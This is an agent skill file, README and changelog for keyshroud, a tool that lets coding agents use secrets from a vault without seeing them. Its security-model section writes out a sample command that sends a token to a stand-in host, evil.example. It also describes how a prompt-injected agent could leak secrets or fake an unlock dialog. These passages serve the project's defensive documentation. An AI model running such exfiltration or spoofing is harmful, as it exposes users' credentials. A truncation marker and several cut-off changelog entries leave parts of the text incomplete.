---
name: keyshroud
description: Use secrets (API keys, tokens, passwords) from the user's keyshroud vault (an encrypted local vault, or their Vaultwarden/Bitwarden) without ever seeing their values. Use whenever a command needs a credential, the user mentions a token/API key/.env, asks to store or rotate a secret, or output might contain a secret.
---

# keyshroud

The user's secrets live in keyshroud's encrypted local vault, or in their
Vaultwarden/Bitwarden (`keyshroud status` says which). You work with **names and
references**, never values. keyshroud injects values into child processes and replaces them
in output with `<redacted:NAME>`.

## Rules

1. Never ask the user to paste a secret into the chat. To store one, run this
   yourself; it opens a hidden-input dialog on the user's desktop, and you only
   see `created … verified=yes`:
   ```bash
   keyshroud add --env STRIPE_API_KEY --item "Stripe API key" --notes "billing service"
   ```
   Tell the user a dialog is waiting for them, and ask for one secret at a time;
   if they cancel, do not ask again unprompted. Never ask for the vault master
   password or passphrase. With the MCP server, call `secrets_request` instead. Over SSH or without a display there is no dialog:
   then give the user the command to run in their own terminal.
2. Never print, echo, `cat`, base64, or otherwise transform a secret value.
   `<redacted:NAME>` in output means the secret was used correctly. Do not try
   to recover it.
3. Never write a secret value into a file. Write a reference instead.
4. Run **every** command that uses a secret through `keyshroud run` (or the
   `secrets_run` MCP tool). Plain shell commands are only masked when they
   succeed; `keyshroud run` masks even when the command fails.
5. Never run `keyshroud get`, `keyshroud env --shell`, `keyshroud inject`
   without `-o`, or `bw` directly — they print values.

## See what exists

```bash
keyshroud env            # wired names only
keyshroud doctor         # vault, keychain, and wiring state (no values)
```
MCP: `secrets_list`, `vault_status`.

## Run a command that needs a secret

```bash
keyshroud run -- gh pr list                       # all wired secrets as env vars
keyshroud run --only GH_TOKEN -- gh pr list       # least privilege
keyshroud run --env-file .env.refs -- npm test    # project references
```
Inside the command, refer to `$GH_TOKEN`; keyshroud resolves it. Output is
masked automatically when not attached to a terminal. MCP: `secrets_run`.

## References (safe to commit)

```
keyshroud://<item>              value in the local vault (also: /notes, /id)
bw://<item>                 Vaultwarden login password
bw://<item>/username        also: notes, totp, uri, id
bw://<item>/fields/<name>   custom field
```
Percent-encode `/` in item names (`keyshroud://a%2Fb`). A project's `.env.refs`:
```dotenv
GH_TOKEN=keyshroud://GitHub CLI token
DATABASE_URL=bw://Prod DB/fields/url
LOG_LEVEL=debug
```

Config files that cannot read env vars: `keyshroud inject -i config.tpl -o config`
renders `{{ keyshroud://item }}` and `{{ bw://item/field }}` placeholders into a 0600 file. Add the output to
`.gitignore`.

## Before committing

```bash
keyshroud scan .          # exits 1 and lists file:line NAME for any leaked value
```

## Exit codes

`0` ok · `2` usage · `3` vault locked/unavailable (ask the user to run
`keyshroud unlock`) · `4` secret missing or item name ambiguous · `5` would
overwrite existing state.

When the vault is locked, a command waits while a dialog on the user's desktop
asks for the master password or passphrase. Never ask for it in chat and never
retry in a loop after a cancel. A local vault that needs a passphrase and does
not exist yet is created by the user in a terminal (`keyshroud unlock`).

On a Mac with a Touch ID vault, a command that needs a secret shows a Touch ID sheet. If an error says
the vault "opens with Touch ID at the Mac", tell the user to approve the sheet, or to run
`keyshroud unlock` at the Mac; never retry in a loop. `keyshroud list` shows item names and their
wiring. Never run `keyshroud rm --yes` or `keyshroud rekey` on your own: they delete or re-key the
user's vault, so only run them when the user asks.

`migrate` is for Vaultwarden users: it needs the personal vault. You may start `setup --email`;
the user picks the agent account's password on the signup page, never through you. If an item
is missing after `setup`, ask the user to run `keyshroud migrate --item "NAME"`.

**Your agents use the keys. They never see them.** **Keep API keys out of Claude Code, Codex, Cursor, Cline, OpenCode, Gemini CLI, pi and omp** — secrets stay in an encrypted vault on your machine (or in your own [Vaultwarden](https://github.com/dani-garcia/vaultwarden) or Bitwarden, to share them between machines), and every value is masked before the model reads it. [![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud) [![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud) [![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json) [🚀 Quickstart](#quickstart) · [🔐 Local vault](#the-local-vault) · [🔄 Sync with Vaultwarden](#sync-across-machines-vaultwarden-or-bitwarden) · [🔌 Supported agents](#supported-agents) · [⚙️ How it works](#how-it-works) · [❓ FAQ](#faq) · [🛡️ Security model](#security-model) · [🌐 Website](https://keyshroud.dev) [🇻🇳 Tiếng Việt](i18n/README.vi.md) · [🇨🇳 简体中文](i18n/README.zh-CN.md) · [🇯🇵 日本語](i18n/README.ja-JP.md)

```console $ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login' deploying with dinhkarate ``` The command got the real token. The transcript — and the model reading it — got ``. (Masking is automatic when an agent runs the command; `--mask` forces it in a human terminal.) ## Why keyshroud? Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs, webhooks, databases. The usual options are bad: - ❌ **Paste the key into the chat** — now it is in the transcript, the provider's logs, and every future context window - ❌ **Put it in `.env`** — the agent `cat`s it while debugging, or commits it - ❌ **Pay for a secrets manager** — `op run` needs a 1Password subscription, and most "agent vaults" are hosted SaaS - ❌ **Use a vault MCP server** — most of them return the plaintext value straight to the model **keyshroud fixes this:** - ✅ **Names, not values** — agents see `GH_TOKEN` and `keyshroud://GitHub token`, never the token - ✅ **Masked output** — any value that reaches stdout/stderr becomes `` - ✅ **Nothing to set up** — an encrypted vault file with its key in your OS keychain; no account, no server - ✅ **Sync if you want it** — Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, for several machines - ✅ **Free** — MIT-licensed, no telemetry ## Features | | | |---|---| | 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout/stderr with `` — streaming-safe across chunk boundaries. | | 🔐 **Local vault** | An AES-256-GCM file whose key is in the macOS keychain, the Linux Secret Service or Windows DPAPI (a passphrase where there is none). No account, no server, no `bw`. | | 🪝 **Agent hooks** | The pi/omp `tool_result` hook redacts every tool result, failed ones included. Claude Code's `PostToolUse` hook redacts every *successful* tool result (Bash, Read, Grep, MCP…) — see [limits](#security-model). | | 🔌 **MCP server** | For clients without a shell: `keyshroud mcp` gives them `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool ever returns a value. | | 🔗 **Committable references** | `keyshroud://item`, `bw://item`, `bw://item/username`, `bw://item/fields/name`, `bw://item/totp` in `.env.refs` files and templates: names, not values. | | ⌨️ **Paste-to-create** | New secrets go through a masked prompt in the user's terminal or a masked popup in pi — never through the chat. | | 📄 **`inject`** | Render `{{ keyshroud://… }}` and `{{ bw://… }}` templates into `0600` config files for tools that can't read env vars (`.npmrc`, kubeconfig). | | 🔎 **`scan`** | Find vault values that leaked into your working tree (pre-commit friendly). | | ⚡ **Fast** | The local vault answers in milliseconds, offline. With Vaultwarden: one batched `bw list items` per session instead of one `bw get` (~3 s) per secret. | | 🔄 **Optional sync** | Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, when the same secrets should reach several machines. `keyshroud://` and `bw://` references work side by side. | | 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. | ## Supported agents | Agent | Install | What you get | |---|---|---| | **Claude Code** | [plugin](#claude-code) | SessionStart + PostToolUse redaction hooks, skill | | **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | env hydration, `tool_result` redaction (failed calls too), `/secret` | | **Codex, OpenCode, Gemini CLI, Cursor agent** | [`npx skills add dinhkarate/keyshroud`](#other-agents-with-a-shell) | skill + CLI with masked output | | **Claude Desktop, chat-only clients** | [`mcpServers` JSON](#mcp-clients-without-a-shell) | MCP tools with masked output | | **Any shell or CI** | `keyshroud run -- ` | env injection + masked output | Agents with a shell use the CLI: it costs no tool schemas in the context, and `keyshroud run` masks output whatever the exit code. The MCP server is for clients that cannot run commands. ## Use cases **"Claude Code keeps reading my `.env`."** Run `keyshroud import` to move the values into the vault and write a `.env.refs` file with lines like `GH_TOKEN=keyshroud://myapp GH_TOKEN`, then start the agent with `keyshroud run --env-file .env.refs -- claude`. The plugin's hooks mask anything that still slips into a tool result. **"I already self-host Vaultwarden."** Log `bw` in to it and run `keyshroud doctor`: a machine with a `bw` login keeps Vaultwarden as the default, and keyshroud adds no server of its own. **"I like `op run` but don't want 1Password."** `keyshroud run` is the same idea — references in, masked output out — with the vault on your machine or on a server you host. **"My agent needs to add a new key."** It runs `keyshroud add` or calls `secrets_request` (MCP), and a hidden-input dialog pops up on your desktop; in pi it is `/secret`. You paste the value there. It never enters the chat. ## Quickstart **Requirements:** Node.js ≥ 18.19. Nothing else: no account, no server. ```bash npm install -g keyshroud # 1. Store a secret — typed into a masked prompt, never echoed. # The first one creates the local vault. keyshroud add --env GH_TOKEN --item "GitHub token" # 2. Use it keyshroud run -- gh auth status keyshroud run -- claude # start an agent with every wired secret available # 3. Check everything keyshroud doctor ``` ```console $ keyshroud add --env GH_TOKEN --item "GitHub token" Paste secret for GH_TOKEN: **************************************** keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking. created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes ``` Without a terminal (an agent's shell), `add` opens a hidden-input dialog on your desktop instead, so an agent can start it and you only paste. Already have a `.env`? `keyshroud import` moves it. ### The local vault `~/.config/keyshroud/vault.json` holds every item, encrypted with AES-256-GCM under one random 256-bit key. Item names are encrypted too; the file is `0600`. Where the key lives depends on the machine: | Machine | Key | Unlocking | |---|---|---| | macOS | login keychain, entry `keyshroud-vault-` | none | | macOS with `KEYSHROUD_VAULT_KEY=secure-enclave` (or `keyshroud rekey --to secure-enclave`) | wrapped to a key in the Mac's Secure Enclave | Touch ID (or the Mac's password) when a command needs a secret; a session ends after 30 minutes | | Linux with a desktop keyring and systemd | Secret Service (`secret-tool`; found with `busctl`) | none | | Windows | DPAPI, bound to your Windows account | none | | Docker, servers, SSH with a locked keyring, Linux without systemd | derived from a passphrase (scrypt) | `keyshroud unlock`; a session ends after 30 minutes | The key mode is chosen once, when the vault is created. To be asked for a passphrase on any machine, create it with `KEYSHROUD_VAULT_KEY=passphrase keyshroud unlock` in a terminal (typed twice, at least 12 characters). When a session has ended, a command that needs a secret asks again: a masked prompt in a terminal, a dialog on the desktop, and over SSH it tells you to run `keyshroud unlock`. A Touch ID vault needs the Xcode Command Line Tools once (`xcode-select --install`): keyshroud builds a small helper from `src/touchid.swift` on first use, which takes a few seconds. The sheet appears for any caller that may ask (the CLI, `secrets_run`, Claude Code's apiKeyHelper); hooks, `status` and `doctor` never ask, and over SSH it tells you to run `keyshroud unlock` at the Mac. `keyshroud rekey` moves a vault between key types (a new key and vault id each time); run `rekey --to passphrase` before moving to another Mac. Nothing can recover a lost key or a forgotten passphrase, and the vault belongs to one machine. `vault.json` is safe to copy as long as its key is not. For backups and several machines, use Vaultwarden or Bitwarden. ### Sync across machines: Vaultwarden or Bitwarden Keep the secrets in Vaultwarden or Bitwarden instead to have them on several machines; `run`, the hooks, the MCP server and everything else work the same, through the Bitwarden CLI. **Get a vault** — pick one: - **Self-host Vaultwarden** (free, your server): follow [examples/vaultwarden](examples/vaultwarden#readme) — Docker Compose + Caddy with automatic HTTPS, from an empty VPS to `keyshroud doctor`, plus backups and hardening. - **Bitwarden cloud** (free account, no server): sign up at [bitwarden.com](https://bitwarden.com) and skip `bw config server` below (EU accounts: `bw config server https://vault.bitwarden.eu`). ```bash npm install -g @bitwarden/cli # 1. Point bw at your server and log in once bw config server https://vault.example.com bw login # 2. Make it the default for new items (keyshroud:// items keep working) mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend # 3. Unlock for 30 minutes (asks for the master password, which is not stored) keyshroud unlock # 4. Check everything keyshroud doctor ``` keyshroud picks the default once per machine and writes it to `~/.config/keyshroud/backend`: Vaultwarden when it finds a `bw` login or anything keyshroud 0.7 left behind, so upgrades change nothing; the local vault otherwise. `KEYSHROUD_BACKEND=local|bw` overrides it, and `keyshroud setup` switches to Vaultwarden by itself. References name their vault, so `keyshroud://…` and `bw://…` items work side by side, and `--item keyshroud://Name` or `--item bw://Name` picks one for a single item. keyshroud never stores the master password unless you do. When Vaultwarden is locked and a command needs a secret, it asks: a masked prompt in a terminal, a native dialog on the desktop (so an agent's command waits for you), and over SSH it tells you to run `keyshroud unlock`. A session ends after 30 minutes (`KEYSHROUD_SESSION_TTL_MS`): a timer runs `bw lock`, so a copied session token stops working too. On a host nobody sits at, `keyshroud unlock --unattended` asks once, in a terminal only, and opens a session without an end. To unlock without being asked, store the master password in the OS keychain (`security add-generic-password -a "$USER" -s vaultwarden-master-password -w`, or `secret-tool store` on Linux; after `setup` the entry is `keyshroud-master-password`; see the [vault setup guide](examples/vaultwarden#optional-unlock-without-being-asked)). Any program running as you can then read it, agents included. Windows has no keychain support for it. ### Least privilege: a separate agent account With the steps above, an unlocked session opens your whole Vaultwarden vault, and an agent that runs `bw` as you can use it. `setup` gives keyshroud its own `bw` login on a dedicated account instead, which holds only the secrets agents need: ```bash keyshroud setup --email you+agent@example.com # opens the signup page, then logs in with the # new master password (asked, not stored); # no `bw config server`: Bitwarden cloud keyshroud migrate # dry run: which wired items would be copied keyshroud migrate --yes # copy them; references keep working ``` - The agent login lives in `~/.config/keyshroud/bw` (`BITWARDENCLI_APPDATA_DIR`). Your own `bw` login is untouched. Its master password is not stored: keyshroud asks for it when a session ends and keeps only a scrypt hash, so `add` can refuse it as a secret. - `migrate` copies the items that wired names (and any `--env-file` / `--item`) reference, with the same names, then locks your personal vault again. Originals stay where they are. It asks for your personal master password in a terminal (or reads the keychain entry `vaultwarden-master-password`). - An agent can run `setup` too. Without a terminal it opens the signup page, where you pick the agent account's master password yourself (save it in your password manager); then the agent runs `setup --registered`, which asks for it in a dialog. The password never passes through anything the agent can read. `--confirm-unlock` and `--unattended` need a terminal. - `--confirm-unlock` (macOS) stores the master password in the keychain entry `keyshroud-master-password` so that macOS asks you before every read, i.e. every unlock. - If bw loses the login (a rejected refresh token logs it out), keyshroud on a Mac with the master password in the keychain asks for Touch ID and logs the agent account back in. - `--unattended` (hosts nobody sits at, e.g. over `ssh -t`) logs in with a session without an end. Unlock it again with `keyshroud unlock --unattended`. - Self-hosted Vaultwarden with `SIGNUPS_ALLOWED=false`: invite the address from the admin page (`/admin`), or allow signups for a minute, then pass `--registered` once the account exists. ## How it works ``` ┌──────────────────────────── your machine ─────────────────────────────┐ │ vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase │ │ │ │ │ ▼ │ Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env │ (optional) │ ▲ │ │ │ └──── redactor ◄──── stdout / stderr ◄──────────────┘ │ │ │ │ └────────────────┼──────────────────────────────────────────────────────┘ ▼ ag …[文件过长——仅保留首 16KB 与末 8KB]… `keyshroud unlock --unattended` there once (no time limit). **Can the agent still use the key?** Yes. The command gets the real value; only the text the model reads is masked. **Is this a sandbox?** No. It stops *accidental* disclosure. A hostile or prompt-injected agent can still exfiltrate a value it can use — see the [security model](#security-model). **Why not just `.gitignore` my `.env`?** That stops commits, not reads. Agents read `.env` to debug, and whatever they read goes to the model provider. **Does it work on Windows?** Yes, tested on Windows 10 with Node 22. The local vault keeps its key with DPAPI, bound to your Windows account. `bw` and other npm CLIs (`.cmd` shims) run without a shell, the unlock dialog is a small PowerShell window, and sessions end after 30 minutes like elsewhere. Files in `%USERPROFILE%\.config\keyshroud` are protected by your profile's ACL (you, SYSTEM, Administrators), not by `0600`. One gap: over an SSH session with a terminal (`ssh -t`), Windows ends the lock timer when the SSH session closes, so that session ends on the next keyshroud call instead. There is no keychain support for the Vaultwarden master password on Windows: keyshroud asks for it, and `migrate` cannot run there. DPAPI may be refused over SSH with a key (`Access is denied`): such a login carries no Windows password. keyshroud says so; run the command in the desktop or RDP session, or give a machine used only over SSH a passphrase vault (`keyshroud rekey --to passphrase`). **`bw login` prints `KeyIdBackfillError`?** `bw` 2026.9 and later call an endpoint that Vaultwarden added in 1.37.4 ([vaultwarden#7750](https://github.com/dani-garcia/vaultwarden/issues/7750)). The login is saved anyway (`bw status` says `locked`), and `keyshroud setup` and the API-key login carry on by themselves. Update Vaultwarden to 1.37.4 or later to make the error go away. ## Security model keyshroud protects against **accidental disclosure**: secrets ending up in transcripts, provider logs, screenshots, commits, or the model's context because a command printed them. It does **not** make a hostile or prompt-injected agent safe. An agent that can run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a value before printing it, can exfiltrate it. If that is your threat model, use an egress proxy that swaps placeholder credentials on the wire (for example Infisical Agent Vault or OneCLI), restrict which secrets each session gets with `--only`, and keep a human approving commands. **The local vault** is encrypted at rest (AES-256-GCM); its key is in your OS keychain (macOS keychain, Linux Secret Service, Windows DPAPI). Any program running as you can read that key, agents included, so in this mode keyshroud does not ask before opening the vault: the same exposure as storing a Vaultwarden master password in the keychain, and weaker than Vaultwarden's ask-every-30-minutes default. Create the vault with `KEYSHROUD_VAULT_KEY=passphrase` to be asked (sessions end after 30 minutes). On a Mac, a **Touch ID vault** (`KEYSHROUD_VAULT_KEY=secure-enclave`, or `keyshroud rekey --to secure-enclave`) closes that gap while no session is open: its key is wrapped to a P-256 key held by the Mac's Secure Enclave, which answers only after the person at the Mac approves a Touch ID sheet (or types the Mac's password). For the session that follows (30 minutes), the key sits in `vault.session` + `vault.token` like a passphrase session, and any program running as you can read it; `keyshroud lock` or a shorter `KEYSHROUD_SESSION_TTL_MS` narrows that window. Touch ID proves someone is present, not what they meant to approve: a program already running as you can show its own sheet, or change keyshroud or its helper to capture the next approval. There is no recovery: the vault opens on that Mac only, so run `rekey --to passphrase` before erasing or moving it, and keep Vaultwarden for backups. A local vault belongs to one machine and has no recovery: back up with Vaultwarden or Bitwarden, which is also the option for several machines. `vault.json` is safe to copy only as long as its key is not. Guarantees we test for: - secret values never appear in argv, logs, diagnostics, MCP results, hook output, or `audit.jsonl`; - new secrets are read from a masked prompt, `--stdin`, or a native dialog, never flags; - the dialog an agent can open says it was requested by a program, warns against the master password, refuses names that are not one printable line, refuses the master password itself, and opens one at a time (30 s pause after a cancel); - the session file, local vault, redact index, rendered templates and auth files are `0600`; - the local vault is replaced atomically (temporary file, fsync, rename) under a lock, changes to any part of it fail its integrity check, and a vault that fails it is never overwritten; - a local vault's passphrase is set only in a terminal, never stored, and refused as a secret; - env.json and auth.json writes are locked and atomic and never overwrite without `--force`; - commands started by `run` and `secrets_run` never receive `BW_SESSION`, `BW_PASSWORD`, `BW_CLIENTID` or `BW_CLIENTSECRET`, so `--only` really limits what a command can read (inside pi/omp the agent process keeps the session for legacy `!bw` auth entries; its value is redacted from tool output); - env files may contain only references and literals: a `!command` value is rejected, and so are variables that change what programs load or run (`PATH`, `NODE_OPTIONS`, `LD_*`, `DYLD_*`, `BASH_ENV`, `GIT_SSH_COMMAND`, …), which are also never wired or injected; - an unparseable `env.json` or `auth.json` is never overwritten. Known limits: a `.env.refs` can reference **any** item in your vault, not only the ones you wired, so read a cloned repo's `.env.refs` before running `--env-file` with it. `import` decides what is secret by heuristics and keeps everything else as a literal; check its plan before committing `.env.refs`. The Claude Code `PostToolUse` hook does not see failed commands (`PostToolUseFailure` cannot rewrite output) or anything a client sends as telemetry, and it only knows wired values, so `keyshroud get bw://…` or `run --no-mask` print in the clear; run secret-using commands through `keyshroud run` or `secrets_run`. An agent with shell access as your user can open a keychain-mode local vault at any time, and use a passphrase vault's session files until the session ends. It can also read `~/.config/keyshroud/session` and use `bw` directly until that session ends — after `setup` that reaches only the agent account; a stored master password (keychain entry or `~/.config/keyshroud/master-password`) it can read at any time, which is why keyshroud asks instead by default; otherwise run agents in a sandbox or container if that matters. The same agent could also draw a window that looks like the unlock dialog; when in doubt, cancel it and run `keyshroud unlock` in a terminal. Without `setup`, keyshroud shares bw's default login, so the 30-minute lock also ends a `bw` session you opened yourself. Redaction is exact-match, so a *partial* or transformed value (`${TOKEN:0:10}`, base64, a line wrapped by a tool) is not masked; values shorter than 6 characters are not redacted (to avoid noise), so don't wire short PINs. Report vulnerabilities privately — see [SECURITY.md](SECURITY.md). ## Development ```bash npm install npm run check # typecheck + tests (fake bw, no real vault) + build node src/cli.ts doctor # run from source (Node ≥ 22.18 strips types) ``` See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in `src/core.ts` (the local vault's file format in `src/vault.ts`); agent integrations live in `extensions/`, `src/mcp.ts` and `src/hooks.ts`. ## Credits Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password) — its popup UI and diagnostics shape are ported here (MIT). Masked output follows 1Password's `op run`. Not affiliated with Bitwarden, Inc. or the Vaultwarden project; "Bitwarden" is a trademark of Bitwarden, Inc. ## License [MIT](LICENSE) © 2026 dinhkarate

# Changelog

All notable changes are documented here. This project follows
[Semantic Versioning](https://semver.org/).

## [Unreleased]

## [0.10.1] - 2026-11-12

### Fixed
- Over SSH with a key, Windows can refuse DPAPI (`Access is denied`, or `Key not valid for use in
  specified state`), since such a login has no Windows password; on a test machine it came and went. keyshroud said the vault opened only for the Windows user who created it; it now names the
  SSH session as the cause and says to use the desktop or RDP session, or a passphrase vault.

## [0.10.0] - 2026-11-12

### Changed
- Local vault items are now referenced as `keyshroud://Item` (`keyshroud://Item/notes`,
  `{{ keyshroud://Item }}` in templates). Everything keyshroud writes uses it: wiring, `.env.refs` from
  `import`, `list`, `rm` and messages. `local://Item`, the first spelling, is still read everywhere, so
  existing wiring and committed `.env.refs` files keep working unchanged. The backend is still called
  `local` (`--to local`, `KEYSHROUD_BACKEND=local`).

## [0.9.5] - 2026-11-11

### Fixed
- Windows PowerShell drops `--` when it runs npm's `keyshroud.ps1`, so `keyshroud run -- <cmd>`
  failed with the usage text there. Without `--`, the command now starts at the first argument that is
  not one of `run`'s own options.
- DPAPI on Windows waited only 30 seconds for PowerShell, which can take a minute to start on a slow
  or busy machine: creating a vault failed with "DPAPI could not protect the key", and opening one
  said it belonged to another Windows user. It now waits two minutes and says when PowerShell did not answer.

## [0.9.4] - 2026-11-11

### Fixed
- Several commands asking for the vault at once could open two dialogs or Touch ID sheets: one
  that found no dialog lock yet then removed the lock another had just taken. Only a stale lock that
  is still unchanged is removed now.

## [0.9.3] - 2026-11-11

### Changed
- Runs on Node.js 18.19 or newer (was 22.18), so the Node.js that Ubuntu 24.04 and Debian 13 install
  with apt is enough. CI runs the whole test suite against the built CLI on Node 18.19 and 20.
- The agent install guide (`keyshroud.dev/install.md`) says how to install Node.js on each OS, asking
  the user first, and how to install without sudo when `npm install -g` fails with `EACCES`.

## [0.9.2] - 2026-11-11

### Added
- `keyshroud migrate --to local [--yes]` moves off Vaultwarden: every Vaultwarden item a wired name
  uses is copied into the local vault, read back, and the names are rewired to it; the local vault then
  becomes the default for new items. Fields other than the password become items of their own. A dry run
  unless `--yes`; Vaultwarden keeps the originals, and the previous references are saved to
  `migrate-local-<time>.json` (references only, `0600`).

## [0.9.1] - 2026-11-11

### Added
- `keyshroud unlock --stdin` reads a passphrase vault's passphrase from stdin, for CI jobs and
  containers: copy the encrypted `vault.json` in and keep only the passphrase in the CI's secret store.
  It opens an existing vault only (a new passphrase is still chosen in a terminal), and its session
  ends after 30 minutes.

## [0.9.0] - 2026-11-11

### Added
- A Touch ID key for the local vault on Macs (`KEYSHROUD_VAULT_KEY=secure-enclave`). The vault key is
  wrapped to a P-256 key in the Mac's Secure Enclave and opens only after Touch ID (or the Mac's
  password); a session then lasts 30 minutes, as with a passphrase. The helper is built from
  `src/touchid.swift` on first use (needs the Xcode Command Line Tools). Hooks, `status` and `doctor`
  never ask; over SSH keyshroud says to run `keyshroud unlock` at the Mac.
- `keyshroud rekey [--to TYPE]`: a new key and vault id for the local vault, between keychain,
  secure-enclave, passphrase and dpapi. Terminal only; it always proves the current key afresh.
- `keyshroud list`: item references and the variables wired to them, names only.
- `keyshroud rm --item ITEM [--yes]`: deletes an item and unwires it. A dry run unless
  `--yes`; `--yes` needs a terminal, or Touch ID on a Mac. bw items only on keyshroud's own agent
  account (moved to the bw trash); the apiKeyHelper's item is refused.

### Changed
- Wiring (which variable points at which item) now lives in keyshroud's own
  `~/.config/keyshroud/env.json`. pi's and omp's `auth.json` are written only when that agent is
  installed (its `~/.pi/agent` or `~/.omp/agent` directory exists) or `--target` names it, so a
  machine without them no longer gets those directories. Names already in an `auth.json` keep
  working; `unwire` without `--target` clears a name from all three files.
- An unknown `KEYSHROUD_VAULT_KEY` value is now an error instead of being ignored.
- A second local unlock dialog waits for the one already open and uses its session.
- The Save dialog also warns against typing the Mac's password.

### Fixed
- Two processes asking at the same moment could both take the dialog lock (one read the lock file
  before the other had written to it) and show two dialogs.

### Note
- 0.8.x cannot read a Touch ID vault (format v2). Run `keyshroud rekey --to keychain` before
  downgrading.

## [0.8.0] - 2026-11-02

### Added
- A local encrypted vault, the default on a machine that has never used
  keyshroud with Vaultwarden. `~/.config/keyshroud/vault.json` is AES-256-GCM
  (item names included); its key is in the macOS keychain, the Linux Secret
  Service or Windows DPAPI, or is derived from a passphrase (scrypt) where none
  of these works (containers, servers, SSH, Linux without systemd's `busctl`).
  No account, no server and no `bw`: after `npm i -g keyshroud`, the first
  `keyshroud add` creates it.
- `local://Item` references (also `/notes` and `/id`) in env files, templates,
  `get` and `inject`. pi/omp auth.json entries are written as
  `!keyshroud get 'local://Item'`, which pi/omp can run without the extension.
- `--item local://Name` or `--item bw://Name` picks the vault for one item in
  `add`, `rotate`, `wire` and `api-key`; `import` writes `local://` references.
- `KEYSHROUD_BACKEND=local|bw` and the file `~/.config/keyshroud/backend`
  choose the default vault. `KEYSHROUD_VAULT_KEY=keychain|dpapi|passphrase`
  chooses how a new local vault keeps its key.
- Passphrase vaults: `keyshroud unlock` creates one in a terminal (typed twice,
  at least 12 characters) and opens 30-minute sessions. `lock` and the end of a
  session also close it for MCP servers and pi sessions that are already running:
  pi removes its values from its environment before the next tool or `!command`.

### Changed
- A machine that used keyshroud 0.7 keeps Vaultwarden as the default: a `bw`
  login, keyshroud's own files, `BW_SESSION`, `bw://` or `!bw` entries in
  auth.json, or the master password in the keychain decide it, and the choice
  is written to `~/.config/keyshroud/backend`. `setup` switches to Vaultwarden.
- `status`, `doctor`, `unlock`, `lock`, the MCP `vault_status` tool and the pi
  extension describe the local vault when it is the default, without starting `bw`.
- Messages show paths in your home directory as `~/…` (not on Windows).

### Fixed
- An error while parsing `bw` output no longer quotes that output, which can
  hold a secret.
- `keyshroud lock` on a machine with no vault says there is nothing to lock.
- On Windows, keyshroud no longer starts `security` or `secret-tool` by bare
  name, which Windows looks up in the current directory first.

## [0.7.6] - 2026-10-24

## [0.7.5] - 2026-10-20

### Fixed
- Any `bw` release works, including 2026.9 and later on Vaultwarden before
  1.37.4. Those `bw` releases save the login and then exit with
  `KeyIdBackfillError`; `setup` and the API-key login now go on when `bw` is

## [0.7.4] - 2026-10-20

### Fixed
- `bw` commands that talk to the server (sync, login, unlock, create, edit,
  delete) run one at a time across every keyshroud process on the machine.
  Vaultwarden replaces the refresh token on each use, so two agents refreshing
  at once could leave bw with a rejected token, and bw then logged the machine
  out for every agent.
- When bw has lost its login, the unresolved-names message says so and how to
  log in again, instead of listing the names with no reason.

## [0.7.3] - 2026-10-19

### Added
- `keyshroud mcp` picks up an update by itself: once `npm i -g keyshroud@…`
  puts a new version on disk, the running server hands requests to a server
  started from the new files, so MCP clients need no restart. Servers started
  before this release need one last restart. `vault_status` shows the version
  that answered.

## [0.7.2] - 2026-10-19

### Security
- Windows: an argument with a line break to a `.cmd`/`.bat` file is refused;
  cmd.exe would run what follows as a command, with the secrets in its
  environment (BatBadBut).
- The trial unlock behind the master-password refusal keeps a session's end only
  up to one session length, so an end date written into the session file no
  longer survives it.

### Fixed
- A logged-out `bw` is reported before anyone is asked for the master password,
  with how to log in again, instead of a request to run `keyshroud unlock`.
- `setup` run again after a logout no longer assumes Bitwarden cloud when no
  `--server` is given; only a first setup does.
- `migrate` asks for the personal master password in a terminal when it is not
  in the keychain.
- `secrets_list` says why names are unresolved; `run` exits 127 for a missing
  command; `keyshroud doctor | head` no longer prints a stack trace; a failed
  `setup` login no longer claims keyshroud switched to the new login.
- Windows: plain words reach a `.cmd`/`.bat` unchanged, so a batch file that
  reads `%1` works again; the lock timer also locks with `BW_PRETTY=true`.

## [0.7.1] - 2026-10-19

### Security
- `setup` from an agent's shell no longer generates the agent account's master
  password and puts it on the clipboard, where the agent could read it. It opens
  the signup page and you pick the password there; `setup --registered` asks for
  it in a dialog. `--confirm-unlock` and `--unattended` need a terminal.
- `add`, `rotate` and `secrets_request` always check a value against the vault

- The lock timer asks `bw` whether its own token still works instead of trusting
  the session file, so rewriting that file no longer keeps a session open.
  `KEYSHROUD_SESSION_TTL_MS` is capped at a day.

### Fixed
- `env` lists wired names while the vault is locked.
- `setup` without `--server` uses Bitwarden cloud when `bw` has no server set.
- Install commands pin `@bitwarden/cli@2026.8.0`; the docs give the
  `keyshroud-…` keychain names used after `setup`, say that Windows has no
  keychain support, and the translations cover Windows and the CLI-first setup.

## [0.7.0] - 2026-10-19

### Changed
- keyshroud no longer needs a stored master password. When the vault is locked
  and a command needs a secret, it asks: a masked prompt in a terminal, a native
  dialog on the desktop (a waiting agent command continues once you unlock), or,
  over SSH, a message to run `keyshroud unlock`. A master password already in the
  keychain or in `~/.config/keyshroud/master-password` still unlocks without asking.
- Sessions end after 30 minutes (`KEYSHROUD_SESSION_TTL_MS`). A background timer
